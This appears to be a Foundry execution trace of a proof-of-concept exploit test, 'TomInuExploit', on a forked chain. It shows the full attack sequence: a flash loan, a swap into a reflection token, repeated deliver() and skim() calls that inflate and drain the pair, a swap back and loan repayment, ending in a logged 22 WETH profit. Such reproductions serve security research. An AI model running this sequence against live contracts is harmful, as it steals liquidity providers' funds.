{
  "logs": {
    "calls": [
      {
        "id": "490001",
        "contract": "TomInuExploit",
        "function": "testHack",
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "0",
            "contract": "VM",
            "function": "createSelectFork",
            "args": "\"<rpc url>\", 16489408 [1.648e7]",
            "return_value": "0",
            "depth": 1,
            "internal_calls": [],
            "value": null
          },
          {
            "id": "481481",
            "contract": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
            "function": "flashLoan",
            "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [104850000000000000000 [1.048e20]], 0x",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": [
              {
                "id": "2534",
                "contract": "wETH",
                "function": "balanceOf",
                "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
                "return_value": "139039729301264180297254 [1.39e23]",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "2350",
                "contract": "0xce88686553686DA562CE7Cea497CE749DA109f9F",
                "function": "getFlashLoanFeePercentage",
                "args": "",
                "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "27962",
                "contract": "wETH",
                "function": "transfer",
                "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 104850000000000000000 [1.048e20]",
                "return_value": "true",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "427672",
                "contract": "TomInuExploit",
                "function": "receiveFlashLoan",
                "args": "[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [104850000000000000000 [1.048e20]], [0], 0x",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "24420",
                    "contract": "wETH",
                    "function": "approve",
                    "args": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "24609",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "approve",
                    "args": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "191414",
                    "contract": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
                    "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                    "args": "104850000000000000000 [1.048e20], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F], TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "8225",
                        "contract": "wETH",
                        "function": "transferFrom",
                        "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb835752Feb00c278484c464b697e03b03C53E11B, 104850000000000000000 [1.048e20]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "20777",
                        "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                        "function": "balanceOf",
                        "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "0",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "2504",
                        "contract": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                        "function": "getReserves",
                        "args": "",
                        "return_value": "0x0000000000000000000000000000000000000000000000609977d2a0e5a8e68e00000000000000000000000000000000000000000000000133514952669a6a7000000000000000000000000000000000000000000000000000000000610fc0b8",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "534",
                        "contract": "wETH",
                        "function": "balanceOf",
                        "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                        "return_value": "126994561461014981232 [1.269e20]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "144905",
                        "contract": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                        "function": "swap",
                        "args": "1470449218539614064547 [1.47e21], 0, TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "108274",
                            "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                            "function": "transfer",
                            "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1470449218539614064547 [1.47e21]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "4777",
                            "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                            "function": "balanceOf",
                            "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                            "return_value": "316871513264115731249 [3.168e20]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "534",
                            "contract": "wETH",
                            "function": "balanceOf",
                            "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                            "return_value": "126994561461014981232 [1.269e20]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "4777",
                        "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                        "function": "balanceOf",
                        "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "1465904852700232013011 [1.465e21]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                    "return_value": "316871513264115731249 [3.168e20]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in pair before deliver\", 316",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "1465904852700232013011 [1.465e21]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in attack contract before deliver\", 1465",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"-------------Delivering-------------\"",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "1465904852700232013011 [1.465e21]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "7383",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "deliver",
                    "args": "1465904852700232013011 [1.465e21]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                    "return_value": "2050642424158542203032 [2.05e21]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in pair after deliver\", 2050",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "6",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in attack contract after deliver\", 0",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"-------------Skimming---------------\"",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "38606",
                    "contract": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                    "function": "skim",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "4777",
                        "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                        "function": "balanceOf",
                        "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                        "return_value": "2050642424158542203032 [2.05e21]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "23174",
                        "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                        "function": "transfer",
                        "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1733770910894426471783 [1.733e21]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "534",
                        "contract": "wETH",
                        "function": "balanceOf",
                        "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                        "return_value": "126994561461014981232 [1.269e20]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "3262",
                        "contract": "wETH",
                        "function": "transfer",
                        "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                    "return_value": "323338092012961377606 [3.233e20]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in pair after skim\", 323",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "1733769909104888397946 [1.733e21]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in attack contract after skim\", 1733",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"-------------Delivering-------------\"",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "1733769909104888397946 [1.733e21]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "7383",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "deliver",
                    "args": "1733769909104888397946 [1.733e21]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                    "return_value": "11191855315120216048899805 [1.119e25]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in pair after deliver 2\", 11191855 [1.119e7]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "4777",
                    "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                    "function": "balanceOf",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "32051 [3.205e4]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"%s TINU in attack contract after deliver 2\", 0",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "534",
                    "contract": "wETH",
                    "function": "balanceOf",
                    "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                    "return_value": "126994561461014981232 [1.269e20]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "40580",
                    "contract": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                    "function": "swap",
                    "args": "0, 126984561461014981232 [1.269e20], TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "23162",
                        "contract": "wETH",
                        "function": "transfer",
                        "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 126984561461014981232 [1.269e20]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "4777",
                        "contract": "0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F",
                        "function": "balanceOf",
                        "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                        "return_value": "11191855315120216048899805 [1.119e25]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "534",
                        "contract": "wETH",
                        "function": "balanceOf",
                        "args": "0xb835752Feb00c278484c464b697e03b03C53E11B",
                        "return_value": "10000000000000000 [1e16]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "3262",
                    "contract": "wETH",
                    "function": "transfer",
                    "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8, 104850000000000000000 [1.048e20]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "534",
                    "contract": "wETH",
                    "function": "balanceOf",
                    "args": "TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "22134561461014981232 [2.213e19]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "console",
                    "function": "log",
                    "args": "\"\\n Attacker's profit: %s WETH\", 22",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              },
              {
                "id": "534",
                "contract": "wETH",
                "function": "balanceOf",
                "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
                "return_value": "139039729301264180297254 [1.39e23]",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          }
        ],
        "value": null
      }
    ]
  }
}